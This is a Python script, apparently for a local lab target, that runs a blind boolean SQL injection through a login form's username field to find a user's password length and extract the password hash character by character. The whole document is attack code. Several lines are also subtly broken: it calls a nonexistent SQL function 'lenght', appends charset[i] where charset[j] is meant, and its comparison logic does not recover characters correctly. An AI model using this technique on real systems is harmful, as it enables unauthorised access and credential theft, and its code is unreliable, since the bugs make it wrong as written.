import requests

total_queries = 0
charset = "0123456789abcdefghijklmnopqrstuvwxyz"
target = "http://127.0.0.1:3000/login"
needle =  "Go back to login"

def injected_query(payload):
	global total_queries
	r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password": "password"})
	total_queries += 1
	return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"):
	payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
	return injected_query(payload)

def invalid_user(user_id):
	payload = "(select id from user where id = {}) >= 0".format(user_id)
	return injected_query(payload)

def password_lenght(user_id):
	lenght = 0
	while True:
		payload = "(select lenght(password) from user where id = {} and lenght(password) <= {} limit 1)".format(user_id, lenght)
		if not injected_query(payload):
			return lenght
		lenght += 1

def extract_hash(charset, user_id, password_lenght):
	found = ""
	for i in range(0, password_lenght):
		for j in range(len(charset)):
			if boolean_query(i, user_id, charset[j]):
				found += charset[i]
				break
	return found

def total_queries_taken():
	global total_queries
	print("\t\t[!] {} total queries!".format(total_queries))
	total_queries = 0

while True:
	try:
		user_id = input("> Enter a user ID to extract the password hash: ")
		if not invalid_user(user_id):
			user_password_lenght = password_lenght(user_id)
			print("\t[-] User {} hash lenght: {}".format(user_id, user_password_lenght))
			total_queries_taken()
			print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_lenght)))
		else:
			print("\t[X] User {} does not exist!".format(user_id))
	except KeyboardInterrupt:
		break